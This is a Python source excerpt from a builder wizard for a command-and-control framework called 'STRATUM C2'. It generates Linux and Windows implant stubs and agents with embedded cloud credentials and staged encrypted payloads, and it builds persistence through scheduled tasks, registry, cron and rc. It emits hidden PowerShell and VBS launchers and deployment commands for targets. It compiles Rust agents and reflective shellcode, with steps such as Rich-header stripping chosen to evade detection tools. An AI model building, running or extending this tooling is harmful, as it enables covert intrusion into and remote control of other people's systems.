            # MED-19: per-deploy Windows persist identity (same values as CRIT-2 Rust consts)
            "PLACEHOLDER_WIN_DIR":        cfg.reg_value,
            "PLACEHOLDER_WIN_TASK_LOGON": cfg.task_name,
            "PLACEHOLDER_WIN_TASK_BOOT":  cfg.task_name,
            "PLACEHOLDER_WIN_REG_VALUE":  cfg.reg_value,
        }
        subs.update(self._agent_ps1_subs(cfg))
        for old, new in subs.items():
            content = content.replace(old, new)
        return content

    def _step_generate_stubs(self, cfg: BaseConfig, agent_dir: Path, pub_pem: bytes) -> None:
        self._step("Stub Generation")
        deploy_id = hashlib.sha256(pub_pem).hexdigest()[:16]
        base_subs = {
            "STUB_SECRET":       cfg.stub_secret,
            "STUB_SALT":         cfg.salt,
            "STUB_WINDOW_START": cfg.window_start,
            "STUB_WINDOW_END":   cfg.window_end,
            "STUB_DEPLOY_ID":    deploy_id,
        }
        base_subs.update(self._stub_subs(cfg))

        for variant, s2_path, blob_path, out_name, label in [
            ("stub.sh",  cfg.s2_path_linux, cfg.blob_path_linux, "stub.sh",  "Linux"),
            ("stub.ps1", cfg.s2_path_win,   cfg.blob_path_win,   "stub.ps1", "Windows"),
        ]:
            transport_src = self.TRANSPORT_DIR / variant
            core_src      = _TEMPLATES_DIR / variant
            if not transport_src.exists():
                warn(f"{out_name} skipped — transport template missing: {transport_src}")
                continue
            if not core_src.exists():
                warn(f"{out_name} skipped — core template missing: {core_src.resolve()}")
                continue
            if variant.endswith(".sh"):
                content = "#!/usr/bin/env bash\n" + transport_src.read_text() + "\n\n" + core_src.read_text()
            else:
                content = _ps1_concat(transport_src.read_text(), core_src.read_text())
            subs = dict(base_subs)
            subs["STUB_S2_PATH"]   = s2_path
            subs["STUB_BLOB_PATH"] = blob_path
            subs["STUB_DBG_INIT"]  = (self._dbg_init_stub_sh(cfg)
                                      if variant.endswith(".sh")
                                      else self._dbg_init_stub_ps1(cfg))
            for old, new in subs.items():
                content = content.replace(old, new)
            dst = agent_dir / out_name
            dst.write_text(content, encoding="utf-8")
            dst.chmod(0o755)
            ok(f"{out_name} → agent/  ({label} — DROP THIS on target)")
            if variant.endswith(".ps1"):
                vbs_name = out_name.replace(".ps1", ".vbs")
                self._write_vbs_launcher(dst, vbs_name)
                ok(f"{vbs_name} → agent/  (Windows launcher — no console flash)")

    def _step_generate_agents_plain(self, cfg: BaseConfig, agent_dir: Path,
                                    pub_pem: bytes) -> None:
        self._step("Stageless-Plain: Agent Generation")
        dst = agent_dir / "agent.sh"
        dst.write_text(self._build_agent_sh(cfg, pub_pem))
        dst.chmod(0o755)
        ok("agent.sh → agent/ (Linux — cleartext, all creds embedded)")
        ps1 = self._build_agent_ps1(cfg, pub_pem)
        if ps1:
            ps1_dst = agent_dir / "agent.ps1"
            ps1_dst.write_text(ps1, encoding="utf-8")
            ok("agent.ps1 → agent/ (Windows — cleartext, all creds embedded)")
            self._write_vbs_launcher(ps1_dst, "agent.vbs")
            ok("agent.vbs → agent/ (Windows launcher — no console flash)")

    def _step_configure(self, cfg: BaseConfig) -> None:
        self._step("Configuration")

        _p([("", "")])
        _p([("class:yellow", "  Delivery Mode:")])
        _p([("class:info",   "    staged-enc      — stub on target, encrypted stage2 on provider (key baked in stub)")])
        _p([("class:info",   "    stageless-enc   — single encrypted file on target, key baked in stub")])
        _p([("class:info",   "    stageless-plain — cleartext agent on target (no encryption)")])
        _valid_modes = ("staged-enc", "stageless-enc", "stageless-plain")
        while True:
            raw_mode = ask("Mode", cfg.mode, choices=_valid_modes)
            if raw_mode in _valid_modes:
                break
            warn(f"Invalid mode '{raw_mode}' — choose: staged-enc / stageless-enc / stageless-plain")
        cfg.mode = raw_mode

        _p([("", "")])
        _p([("class:yellow", "  Channel Paths:")])
        fp = ask("Folder path", cfg.folder_path)
        if not fp.startswith("/"):
            fp = "/" + fp
        cfg.folder_path    = fp.rstrip("/")
        cfg.input_file     = ask("Input file",     cfg.input_file)
        cfg.output_file    = ask("Output file",    cfg.output_file)
        cfg.heartbeat_file = ask("Heartbeat file", cfg.heartbeat_file)

        _p([("", "")])
        _p([("class:yellow", "  Agent Timing:")])
        cfg.base_sleep     = ask_int("Base sleep seconds (1-86400)", cfg.base_sleep, 1, 86400)
        cfg.jitter_percent = ask_int("Jitter percent (0-50)",        cfg.jitter_percent, 0, 50)

        _p([("", "")])
        _p([("class:yellow", "  Payload Blob Paths (on target machine):")])
        cfg.blob_path_linux = ask("Linux blob path",   cfg.blob_path_linux)
        cfg.blob_path_win   = ask("Windows blob path", cfg.blob_path_win)

        _p([("", "")])
        _p([("class:yellow", "  Time-Window Lock (HH:MM — empty to disable):")])
        cfg.window_start = ask("Window start (e.g. 08:00)", cfg.window_start)
        if cfg.window_start:
            cfg.window_end = ask("Window end   (e.g. 18:00)", cfg.window_end)
        else:
            cfg.window_end = ""

        _p([("", "")])
        _p([("class:yellow", "  Kill Date (YYYY-MM-DD — empty to disable):")])
        _p([("class:info",   "    Agent self-destructs (removes persist + binary) on or after this date")])
        cfg.kill_date = ask("Kill date (e.g. 2026-12-31)", cfg.kill_date)
        # Basic format validation — non-blocking, agent ignores malformed values
        if cfg.kill_date:
            import re as _re
            if not _re.match(r"^\d{4}-\d{2}-\d{2}$", cfg.kill_date):
                cfg.kill_date = ""

        _p([("", "")])
        _p([("class:yellow", "  Debug Mode:")])
        _p([("class:info",   "    WARNING: debug=yes embeds print statements — avoid in operational builds")])
        cfg.debug_mode = ask_yn("Enable debug output (operational: no)", cfg.debug_mode)

        self._step_configure_extra(cfg)
        self._show_config(cfg)
        self._print_mode_diagram(cfg)

    def _show_config(self, cfg: BaseConfig) -> None:
        W = 52
        _p([("", "")])
        _p([("class:cyan", "  ┌" + "─" * W + "┐")])
        _p([("class:cyan", "  │"), ("class:bold", f"{'  CONFIGURATION RECAP':^{W}}"), ("class:cyan", "│")])
        _p([("class:cyan", "  ├" + "─" * W + "┤")])

        def _row(label, value, vc="class:green"):
            lbl = f"  {label:<12}"
            pad = W - len(lbl) + 2 - len(str(value)) - 2
            _p([("class:cyan",   "  │"),
                ("class:yellow", f"  {label:<12}"),
                (vc,             str(value)),
                ("class:dim",    " " * max(pad, 0)),
                ("class:cyan",   "│")])

        _row("Mode",      cfg.mode, "class:bold")
        _row("Debug",     "ENABLED" if cfg.debug_mode else "off",
             "class:red" if cfg.debug_mode else "class:dim")
        _row("Provider",  self.PROVIDER_NAME)
        _row("Folder",    cfg.folder_path)
        _row("Input",     cfg.folder_path + cfg.input_file)
        _row("Output",    cfg.folder_path + cfg.output_file)
        _row("Heartbeat", cfg.folder_path + cfg.heartbeat_file)
        _row("Sleep",     f"{cfg.base_sleep}s  +/-{cfg.jitter_percent}%")
        if cfg.window_start:
            _row("Window",  f"{cfg.window_start} → {cfg.window_end}")
        if cfg.kill_date:
            _row("Kill date", cfg.kill_date, "class:red")
        _p([("class:cyan", "  └" + "─" * W + "┘")])
        _p([("", "")])

    def _print_mode_diagram(self, cfg: BaseConfig) -> None:
        Y, I = "class:yellow", "class:info"
        DIAGRAMS = {
            "staged-enc": [
                (Y, " ── STAGED-ENC ────────────────────────────────────────────────────────"),
                (I, "   OPERATOR                   CLOUD                      TARGET"),
                (I, "         │─── .s2l (enc) ─────>│  [key baked in stub]   │"),
                (I, "         │                     │<─── fetch .s2l ────────│  (ddb miss)"),
                (I, "         │                     │──── .s2l ─────────────>│  decrypt + exec"),
                (I, "         │<────── heartbeat (cancels .s2l) ─────────────│"),
                (I, "         │──────── command ────────────────────────────>│"),
                (I, "         │<────── output ───────────────────────────────│"),
                (Y, " ─────────────────────────────────────────────────────────────────────"),
            ],
            "stageless-enc": [
                (Y, " ── STAGELESS-ENC ─────────────────────────────────────────────────────"),
                (I, "      OPERATOR                CLOUD                      TARGET"),
                (I, "         │─── agent_stageless ─────────────────────────>│  embedded payload"),
                (I, "         │                     │         [key baked in stub, decrypt + exec]"),
                (I, "         │<────── heartbeat ────────────────────────────│"),
                (I, "         │──────── command ────────────────────────────>│"),
                (Y, " ─────────────────────────────────────────────────────────────────────"),
            ],
            "stageless-plain": [
                (Y, " ── STAGELESS-PLAIN ───────────────────────────────────────────────────"),
                (I, "   OPERATOR                   CLOUD                      TARGET"),
                (I, "         │─── agent.sh/.ps1 ──────────────────────────>│  cleartext, exec directly"),
                (I, "         │<────── heartbeat ────────────────────────────│"),
                (I, "         │──────── command ────────────────────────────>│"),
                (Y, " ─────────────────────────────────────────────────────────────────────"),
            ],
        }
        _p([("", "")])
        for color, line in DIAGRAMS.get(cfg.mode, []):
            _p([(color, "  " + line)])
        _p([("", "")])

    def _step_generate_docs(self, cfg: BaseConfig, deploy_dir: Path,
                            session_id: str) -> None:
        agent_dir = deploy_dir / "agent"
        fp        = cfg.folder_path

        if cfg.mode == "staged-enc":
            arch         = "ARCHITECTURE: STAGED ENCRYPTED PAYLOAD (key baked in stub)\n"
            deploy_linux = f"  scp {deploy_dir}/agent/stub.sh user@target:/tmp/\n  ssh user@target 'chmod +x /tmp/stub.sh && nohup /tmp/stub.sh &>/dev/null &'\n"
            deploy_win   = "  wscript stub.vbs          (no console flash — recommended)\n  powershell -ep bypass -w hidden -f stub.ps1  (direct, may flash briefly)\n"
        elif cfg.mode == "stageless-enc":
            arch         = "ARCHITECTURE: STAGELESS ENCRYPTED (key baked in stub)\n"
            deploy_linux = f"  scp {deploy_dir}/agent/agent_stageless.sh user@target:/tmp/\n  ssh user@target 'chmod +x /tmp/agent_stageless.sh && nohup /tmp/agent_stageless.sh &>/dev/null &'\n"
            deploy_win   = "  wscript agent_stageless.vbs   (no console flash — recommended)\n  powershell -ep bypass -w hidden -f agent_stageless.ps1  (direct, may flash briefly)\n"
        else:
            arch         = "ARCHITECTURE: STAGELESS PLAIN\n"
            deploy_linux = f"  scp {deploy_dir}/agent/agent.sh user@target:/tmp/\n  ssh user@target 'chmod +x /tmp/agent.sh && nohup /tmp/agent.sh &>/dev/null &'\n"
            deploy_win   = "  wscript agent.vbs          (no console flash — recommended)\n  powershell -ep bypass -w hidden -f agent.ps1  (direct, may flash briefly)\n"

        common = (
            f"  Provider:  {self.PROVIDER_NAME}\n  Mode:      {cfg.mode}\n"
            f"  Folder:    {fp}\n  Input:     {fp}{cfg.input_file}\n"
            f"  Output:    {fp}{cfg.output_file}\n  Heartbeat: {fp}{cfg.heartbeat_file}\n"
            f"  Sleep:     {cfg.base_sleep}s +/-{cfg.jitter_percent}%\n"
            + (f"  Window:    {cfg.window_start} → {cfg.window_end}\n" if cfg.window_start else "")
            + (f"  Kill date: {cfg.kill_date}\n" if cfg.kill_date else "")
        )

        guide = (
            "=== STRATUM C2 — DEPLOYMENT GUIDE ===\n\n"
            f"Session ID: {session_id}\n"
            f"Generated:  {_tz.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            + arch + "\nCONFIGURATION:\n" + common
            + "\nDEPLOY ON TARGET:\n  Linux:\n" + deploy_linux
            + "\n  Windows:\n" + deploy_win
            + "\nTERMINATE AGENT:\n  /kill  (inside controller)\n"
        )
        (deploy_dir / "DEPLOYMENT_GUIDE.txt").write_text(guide)
        (agent_dir / "README.txt").write_text(
            f"=== AGENT — {cfg.mode.upper()} ===\n\n" + arch + "\n" + common
            + "\nDEPLOY:\n  Linux:\n" + deploy_linux + "\n  Windows:\n" + deploy_win
        )
        ok("DEPLOYMENT_GUIDE.txt + agent/README.txt generated")

    def _step_summary(self, cfg: BaseConfig, deploy_dir: Path, session_id: str) -> None:
        _p([("", "")])
        _p([("class:green", "  +=================================================================+")])
        _p([("class:green", "  |      DEPLOYMENT COMPLETE — SESSION ACTIVE IN CONTROLLER        |")])
        _p([("class:green", "  +=================================================================+")])
        _p([("", "")])
        _p([("class:cyan",   f"  Session ID:  {session_id}")])
        _p([("class:cyan",   f"  Provider:    {self.PROVIDER_NAME}")])
        _p([("class:cyan",   f"  Channel:     {cfg.folder_path + cfg.input_file}")])
        _p([("class:cyan",   f"  Mode:        {cfg.mode}")])
        _p([("", "")])
        _p([("class:yellow", "  Agent artifacts:")])
        info(f"  {deploy_dir}/agent/")
        _p([("", "")])
        _p([("class:yellow", "  Next step:")])
        info("  Deploy the agent/stub on the target (see DEPLOYMENT_GUIDE.txt)")
        info(f"  Then: interact {session_id}")
        _p([("", "")])
        ok("Done.")
        _p([("", "")])

    # ── compiled artifact generation ──────────────────────────────────────────

    def _step_compile_artifacts(self, cfg: BaseConfig, agent_dir: Path,
                                pub_pem: bytes = b"") -> None:
        """
        Compile native Rust agent binaries — one artifact per platform, no interpreters.

        Produces (where toolchain is available):
          agent.exe — native Rust PE, MSVC-ABI (clang-cl + lld-link + xwin SDK)
          agent.dll — cdylib variant, same toolchain
          agent.bin — x64 reflective shellcode (embeds + loads agent.exe in-memory, no PS)
          agent.elf — native Rust ELF, musl-static (zero runtime deps)

        Windows target requires: clang + lld + xwin SDK (~/.xwin).
        Linux target requires: musl-gcc / musl-tools.
        Any missing component is warned and skipped — the step never fails the wizard.
        """
        import shutil as _shutil
        import subprocess as _sp

        self._step("Compile native Rust artifacts")

        _native = Path(__file__).parent.parent / "agents" / "native"

        _cargo_bin = Path.home() / ".cargo" / "bin"
        if not _shutil.which("cargo") and (_cargo_bin / "cargo").exists():
            import os as _os
            _os.environ["PATH"] = str(_cargo_bin) + _os.pathsep + _os.environ.get("PATH", "")

        if not _shutil.which("cargo"):
            warn("cargo not found — skipping compiled artifacts")
            warn("Install: curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh")
            return

        _has_musl  = bool(_shutil.which("musl-gcc") or _shutil.which("x86_64-linux-musl-gcc"))

        # MSVC-compatible cross-compilation via clang-cl + lld-link + xwin Windows SDK.
        # Preferred over MinGW: produces MSVC-ABI PE files (correct .pdata, SEH, no
        # GCC runtime fingerprint) — harder to identify with tools like RIFT or DIE.
        # xwin SDK location: respect XWIN_DIR env, then check home, then SUDO_USER home.
        _xwin_dir = None
        for _candidate in [
            Path(os.environ.get("XWIN_DIR", "")) if os.environ.get("XWIN_DIR") else None,
            Path.home() / ".xwin",
            Path(f"/home/{os.environ.get('SUDO_USER', '')}/.xwin") if os.environ.get("SUDO_USER") else None,
        ]:
            if _candidate and _candidate.is_dir() and (_candidate / "crt").is_dir():
                _xwin_dir = _candidate
                break
        _has_msvc_cl = (
            bool(_shutil.which("clang-cl")) and
            bool(_shutil.which("lld-link")) and
            _xwin_dir is not None
        )
        _xd = str(_xwin_dir) if _xwin_dir else ""
        _msvc_env = {
            "CARGO_TARGET_X86_64_PC_WINDOWS_MSVC_LINKER": "lld-link",
            "CC_x86_64_pc_windows_msvc":  "clang-cl",
            "CXX_x86_64_pc_windows_msvc": "clang-cl",
            "AR_x86_64_pc_windows_msvc":  "llvm-lib",
            "RUSTFLAGS": (
                f"-Lnative={_xd}/crt/lib/x86_64 "
                f"-Lnative={_xd}/sdk/lib/um/x86_64 "
                f"-Lnative={_xd}/sdk/lib/ucrt/x86_64"
            ),
            "CFLAGS_x86_64_pc_windows_msvc": (
                f"-Wno-unused-command-line-argument -fuse-ld=lld-link "
                f"/imsvc{_xd}/crt/include "
                f"/imsvc{_xd}/sdk/include/ucrt "
                f"/imsvc{_xd}/sdk/include/um "
                f"/imsvc{_xd}/sdk/include/shared"
            ),
            "RC": "llvm-rc",
        }

        # Determine the entry-point script for each platform based on deploy mode.
        # _base is the shared filename stem used for all artifacts of this mode.
        if cfg.mode == "staged-enc":
            _win_script  = agent_dir / "stub.ps1"
            _lin_script  = agent_dir / "stub.sh"
        elif cfg.mode == "stageless-enc":
            _win_script  = agent_dir / "agent_stageless.ps1"
            _lin_script  = agent_dir / "agent_stageless.sh"
        else:  # stageless-plain
            _win_script  = agent_dir / "agent.ps1"
            _lin_script  = agent_dir / "agent.sh"
        _base = _win_script.stem  # "stub" | "agent_stageless" | "agent"

        def _cargo(wrapper_dir: Path, agent_path: Path,
                   extra_args: list, out_name: str, dest: Path,
                   extra_env: dict | None = None) -> bool:
            if not wrapper_dir.exists():
                warn(f"Wrapper dir missing: {wrapper_dir}")
                return False
            env = {
                **__import__("os").environ,
                "STRATUM_AGENT_PATH": str(agent_path.resolve()),
                "CC_x86_64_unknown_linux_musl": "musl-gcc",
                **(extra_env or {}),
            }
            try:
                r = _cancelable_run(
                    ["cargo", "build", "--release"] + extra_args,
                    cwd=wrapper_dir, env=env,
                    capture_output=True, text=True,
                )
            except _sp.CalledProcessError as _ce:
                warn(f"  cargo cancelled: {_ce.stderr.strip() if isinstance(_ce.stderr, str) else ''}")
                return False
            if r.returncode != 0:
                log_file = agent_dir / "cargo_build.log"
                log_file.write_text(r.stderr, encoding="utf-8")
                warn(f"  cargo failed for {dest.name} — full log: {log_file}\n  {r.stderr.strip()[-200:]}")
                return False
            # Locate the build output and copy to agent_dir
            target_dir = wrapper_dir / "target"
            for candidate in target_dir.rglob(out_name):
                if "/release/" in str(candidate) and not str(candidate).endswith(".d"):
                    import shutil
                    shutil.copy2(candidate, dest)
                    return True
            warn(f"  Build output not found: {out_name}")
            return False

        # ── x64 raw binary shellcode ─────────────────────────────────────────
        # Built after the native agent EXE so the PE is available to embed.
        # Deferred — see after the native agent block below.

        # ── Native Rust agent (agent-rs) ─────────────────────────────────────
        # Fully self-contained: RSA+AES C2, Dropbox transport, persistence compiled in.
        # One artifact per platform — no powershell.exe, no bash, no interpreter.
        if pub_pem:
            _native_dir = _native / "rust"
            if not _native_dir.exists():
                warn("agents/native/rust not found — skipping native agent")
            else:
                _stun_ip = _resolve_stun_ip()

                # Mode-agnostic base: transport creds, timing, blob paths.
                _native_base = {
                    **__import__("os").environ,
                    "STRATUM_WINDOW_START":    cfg.window_start or "",
                    "STRATUM_WINDOW_END":      cfg.window_end   or "",
                    "STRATUM_KILL_DATE":       cfg.kill_date    or "",
                    "STRATUM_BLOB_PATH_LINUX": cfg.blob_path_linux,
                    "STRATUM_BLOB_PATH_WIN":   cfg.blob_path_win,
                    "STRATUM_DEBUG":           "true" if cfg.debug_mode else "false",
                    "CC_x86_64_unknown_linux_musl": "musl-gcc",
                    **self._native_agent_extra_env(cfg),  # APP_KEY/SECRET/REFRESH_TOKEN
                    # Per-deployment persist identity (CRIT-1 Linux, CRIT-2 Windows)
                    "STRATUM_PERSIST_SUFFIX":  cfg.persist_suffix,
                    "STRATUM_PERSIST_PAYLOAD": cfg.persist_payload,
                    "STRATUM_PERSIST_SVC":     cfg.persist_svc,
                    "STRATUM_CRON_COMMENT":    cfg.cron_comment,
                    "STRATUM_RC_COMMENT":      cfg.rc_comment,
                    "STRATUM_TASK_NAME":       cfg.task_name,
                    "STRATUM_REG_VALUE":       cfg.reg_value,
                    "STRATUM_UA":              cfg.ua,
                    "STRATUM_STAGING_PREFIX":  cfg.staging_prefix,
                }

                # Force cargo to use system PATH for musl-gcc and other tools
                import os as _os_mod
                _sys_env = {"PATH": _os_mod.environ.get("PATH", "")}

                if cfg.mode == "staged-enc":
                    # Stub decrypts + execs stage2 using stub_secret baked at compile time.
                    # No RSA key baked in — that lives inside the encrypted stage2.
                    _native_env = {
                        **_native_base,
                        **_sys_env,
                        "STRATUM_DEPLOY_MODE":    "staged-enc",
                        "STRATUM_STUB_SECRET":    cfg.stub_secret,
                        "STRATUM_SALT":           cfg.salt,
                        "STRATUM_S2_PATH_LINUX":  cfg.s2_path_linux,
                        "STRATUM_S2_PATH_WIN":    cfg.s2_path_win,
                    }
                    # Stage2 DLL must be compiled as stageless-plain — all C2 constants
                    # baked in. The stub EXE uses _native_env (staged-enc); the DLL uses this.
                    import base64 as _b64_s2
                    _stage2_dll_env = {
                        **_native_base,
                        **_sys_env,
                        "STRATUM_DEPLOY_MODE":    "stageless-plain",
                        "STRATUM_FOLDER_PATH":    cfg.folder_path,
                        "STRATUM_INPUT_FILE":     cfg.input_file,
                        "STRATUM_OUTPUT_FILE":    cfg.output_file,
                        "STRATUM_HEARTBEAT_FILE": cfg.heartbeat_file,
                        "STRATUM_BASE_SLEEP":     str(cfg.base_sleep),
                        "STRATUM_JITTER":         str(cfg.jitter_percent),
                        "STRATUM_PUBLIC_KEY_B64": _b64_s2.b64encode(pub_pem).decode(),
                        "STRATUM_STUN_IP":        _stun_ip,
                        "STRATUM_SESSION_KEY":    cfg.session_key,
                        "STRATUM_DEBUG":          "true" if cfg.debug_mode else "false",
                    }
                elif cfg.mode == "stageless-enc":
                    # Full agent; C2 config encrypted with stub_secret baked in stub.
                    # Transport creds (APP_KEY etc.) are plain so the agent can auth to cloud.
                    _cfg_fields = "|".join([
                        cfg.folder_path, cfg.input_file, cfg.output_file,
                        cfg.heartbeat_file, str(cfg.base_sleep), str(cfg.jitter_percent),
                        base64.b64encode(pub_pem).decode(), _stun_ip, cfg.session_key,
                    ])
                    _enc_cfg = self._encrypt_payload(_cfg_fields, cfg.stub_secret)
                    _native_env = {
                        **_native_base,
                        **_sys_env,
                        "STRATUM_DEPLOY_MODE":      "stageless-enc",
                        "STRATUM_STUB_SECRET":      cfg.stub_secret,
                        "STRATUM_SALT":             cfg.salt,
                        "STRATUM_ENCRYPTED_CONFIG": _enc_cfg,
                        **self._native_agent_extra_env(cfg),  # Ensure transport creds are present
                    }
                else:
                    # stageless-plain — fully self-contained, original behaviour.
                    _native_env = {
                        **_native_base,
                        **_sys_env,
                        "STRATUM_DEPLOY_MODE":    "stageless-plain",
                        "STRATUM_FOLDER_PATH":    cfg.folder_path,
                        "STRATUM_INPUT_FILE":     cfg.input_file,
                        "STRATUM_OUTPUT_FILE":    cfg.output_file,
                        "STRATUM_HEARTBEAT_FILE": cfg.heartbeat_file,
                        "STRATUM_BASE_SLEEP":     str(cfg.base_sleep),
                        "STRATUM_JITTER":         str(cfg.jitter_percent),
                        "STRATUM_PUBLIC_KEY_B64": base64.b64encode(pub_pem).decode(),
                        "STRATUM_STUN_IP":        _stun_ip,
                        "STRATUM_SESSION_KEY":    cfg.session_key,
                    }

                # Force recompile of stratum-agent-rs for every deployment.
                #
                # Root cause: Cargo keeps a compiled build.rs binary in
                #   target/release/build/stratum-agent-rs-<hash>/
                # When build.rs changes between sessions the OLD compiled binary may
                # still be referenced by the per-target fingerprint.  That stale binary
                # emits only cargo:rerun-if-env-changed= lines (no cargo:rustc-env=VALUE),
                # so Cargo sees the same build-script output every run and never
                # recompiles the agent — producing identical binaries across deployments.
                #
                # Fix: delete every stratum-agent-rs build/ and .fingerprint/ subdirectory
                # before building.  Cargo recompiles build.rs from source, gets fresh
                # output with the new STRATUM_* values, and recompiles the crate.
                # Dependency crates (reqwest, rsa, aes …) are untouched.
                import shutil as _fsh
                _target_root = _native_dir / "target"
                # Host-compiled build script (shared across target triples)
                _host_build = _target_root / "release" / "build"
                if _host_build.exists():
                    for _d in _host_build.glob("stratum-agent-rs-*"):
                        _fsh.rmtree(_d, ignore_errors=True)
                # Per-target build script output + crate fingerprint
                for _triple in [
                    "x86_64-pc-windows-msvc",
                    "x86_64-pc-windows-gnu",
                    "x86_64-unknown-linux-musl",
                    "x86_64-unknown-none",
                ]:
                    for _sub in ("release/build", "release/.fingerprint"):
                        _d_root = _target_root / _triple / _sub
                        if _d_root.exists():
                            for _d in _d_root.glob("stratum-agent-rs-*"):
                                _fsh.rmtree(_d, ignore_errors=True)
                            # Also invalidate the compiled crate fingerprint so Cargo
                            # recompiles lib.rs/main.rs even if source timestamps are stale
                            # (can happen with cross-compilation clock skew via cargo-xwin).
                            if _sub == "release/.fingerprint":
                                for _d in _d_root.glob("agent-*"):
                                    _fsh.rmtree(_d, ignore_errors=True)
                # Remove any stale agent artifacts from non-MSVC triples that
                # a previous MinGW build may have left behind.  Without this,
                # rglob-based searches (e.g. in the shellcode launcher) could
                # pick up the wrong binary.  We only produce MSVC-ABI PE files
                # for Windows, so the gnu artifact is always wrong.
                for _stale in (
                    _target_root / "x86_64-pc-windows-gnu" / "release" / "agent.exe",
                    _target_root / "x86_64-pc-windows-gnu" / "release" / "agent.dll",
                ):
                    try:
                        _stale.unlink(missing_ok=True)
                    except OSError:
                        pass

                def _cargo_native(extra_args: list, out_name: str, dest: Path,
                                  win_env: dict | None = None) -> bool:
                    env = {**_native_env, **(win_env or {})}
                    try:
                        r = _cancelable_run(
                            ["cargo", "build", "--release"] + extra_args,
                            cwd=_native_dir, env=env,
                            capture_output=True, text=True,
                        )
                    except _sp.CalledProcessError as _ce:
                        warn(f"  cargo cancelled: {_ce.stderr.strip() if isinstance(_ce.stderr, str) else ''}")
                        return False
                    if r.returncode != 0:
                        log_file = agent_dir / "cargo_build.log"
                        log_file.write_text(r.stderr, encoding="utf-8")
                        warn(f"  cargo failed for {dest.name} — full log: {log_file}\n  {r.stderr.strip()[-200:]}")
                        return False
                    # Derive the exact output path from --target to avoid rglob
                    # accidentally picking up stale artifacts for a different triple
                    # (e.g. a leftover x86_64-pc-windows-gnu/release/agent.exe).
                    try:
                        triple = extra_args[extra_args.index("--target") + 1]
                        candidate = _native_dir / "target" / triple / "release" / out_name
                    except (ValueError, IndexError):
                        candidate = _native_dir / "target" / "release" / out_name
                    if candidate.exists():
                        import shutil as _sh
                        _sh.copy2(candidate, dest)
                        return True
                    warn(f"  Build output not found: {out_name}")
                    return False

                def _strip_rich_header(pe_path: Path) -> None:
                    """LOW-4: zero the Rich Header in the PE DOS stub (bytes 0x80–0xFC).

                    The Rich Header sits between the DOS stub and PE header at a
                    compiler-specific offset, terminated by 'Rich' + checksum (8 bytes).
                    We locate it by scanning backwards from e_lfanew for the 'Rich'
                    marker, then zero from the 'DanS' marker to end-of-Rich.
                    Falls back to zeroing the fixed 0x80–0xFC range if not found.
                    """
                    try:
                        data = bytearray(pe_path.read_bytes())
                        if len(data) < 0x100 or data[:2] != b'MZ':
                            return
                        e_lfanew = int.from_bytes(data[0x3C:0x40], 'little')
                        end = min(e_lfanew, len(data))
                        # Scan backwards for b'Rich'
                        rich_end = -1
                        for i in range(end - 4, 0x3F, -1):
                            if data[i:i+4] == b'Rich':
                                rich_end = i + 8  # include 4-byte checksum
                                break
                        # Scan backwards for b'DanS' (start of Rich Header)
                        rich_start = 0x80  # fallback
                        if rich_end > 0:
                            xor_key = int.from_bytes(data[rich_end-4:rich_end], 'little')
                            for i in range(rich_end - 8, 0x3F, -4):
                                if (int.from_bytes(data[i:i+4], 'little') ^ xor_key) == 0x536E6144:
                                    rich_start = i
                                    break
                            for i in range(rich_start, min(rich_end, len(data))):
                                data[i] = 0
                        # No Rich marker found — lld-link does not emit one; nothing to strip
                        if rich_end > 0:
                            pe_path.write_bytes(bytes(data))
                    except Exception as _e:
                        warn(f"Rich Header strip failed for {pe_path.name}: {_e}")

                # Windows EXE + DLL — MSVC only (clang-cl + lld-link + xwin SDK)
                if _has_msvc_cl:
                    _win_tgt = "x86_64-pc-windows-msvc"
                    _sp.run(["rustup", "target", "add", _win_tgt], capture_output=True)
                    _exe_dest = agent_dir / f"{_base}.exe"
                    if _cargo_native(["--target", _win_tgt, "--bin", "agent"],
                                     "agent.exe", _exe_dest,
                                     win_env=_msvc_env):
                        _strip_rich_header(_exe_dest)  # LOW-4
                        ok(f"{_base}.exe compiled  (native Rust, MSVC-ABI)")
                    _dll_name = f"{_base}.dll"
                    _dll_dest = agent_dir / _dll_name
                    # In staged-enc mode the DLL is the stage2 payload — must be compiled as
                    # stageless-plain so all C2 constants (folder, keys, session key) are
                    # baked in. The stub EXE is compiled with _native_env (staged-enc mode).
                    if cfg.mode == "staged-enc":
                        _dll_win_env = {**_stage2_dll_env, **_msvc_env}
                    else:
                        _dll_win_env = _msvc_env
                    if _cargo_native(["--target", _win_tgt, "--lib"],
                                     "agent.dll", _dll_dest,
                                     win_env=_dll_win_env):
                        _strip_rich_header(_dll_dest)  # LOW-4
                        ok(f"{_dll_name} compiled  (native Rust, MSVC-ABI)")
                        info(f"  Launch → rundll32.exe {_dll_name},Run")
                        info(f"  Launch → regsvr32 /s {_dll_name}")
                else:
                    # Diagnostic: show exactly which check failed
                    _diag = []
                    if not _shutil.which("clang-cl"):
                        _diag.append("clang-cl not in PATH")
                    if not _shutil.which("lld-link"):
                        _diag.append("lld-link not in PATH")
                    if _xwin_dir is None:
                        _diag.append(f"xwin SDK not found (checked: {Path.home()}/.xwin"
                                     f"{', /home/' + os.environ.get('SUDO_USER','') + '/.xwin' if os.environ.get('SUDO_USER') else ''})")
                    warn(f"MSVC toolchain not found — skipping Windows native agent")
                    warn(f"  Reason: {'; '.join(_diag)}")
                    warn("  Fix: apt install clang lld && cargo install xwin")
                    warn("       xwin --accept-license splat --output ~/.xwin")
                    warn("       rustup target add x86_64-pc-windows-msvc")

                # Linux ELF — musl-static, fully self-contained, zero runtime deps
                _lin_tgt = "x86_64-unknown-linux-musl"
                _sp.run(["rustup", "target", "add", _lin_tgt], capture_output=True)
                if _cargo_native(["--target", _lin_tgt, "--bin", "agent"],
                                 "agent", agent_dir / f"{_base}.elf"):
                    ok(f"{_base}.elf compiled  (native Rust, musl-static)")
                elif not _has_musl:
                    warn("musl-tools not found — if build failed: apt install musl-tools")

                # ── x64 reflective shellcode — embeds the MSVC DLL ───────────
                # DLL is used instead of EXE: an EXE entry point expects full CRT
                # init (GetStartupInfoW etc.) and crashes when called as DllMain.
                # DllMain(DLL_PROCESS_ATTACH) is the correct reflective-load entry.
                _dll_path = agent_dir / f"{_base}.dll"
                _exe_path = agent_dir / f"{_base}.exe"  # kept for reference only
                if _dll_path.exists():
                    _sc_tgt = "x86_64-unknown-none"
                    _sp.run(["rustup", "target", "add", _sc_tgt], capture_output=True)

                    # _cargo() passes STRATUM_AGENT_PATH; we need STRATUM_PE_PATH.
                    # Build a minimal wrapper that sets the right env var and invokes cargo.
                    import os as _os_sc
                    import shutil as _sh_sc
                    _sc_dir = _native / "shellcode"
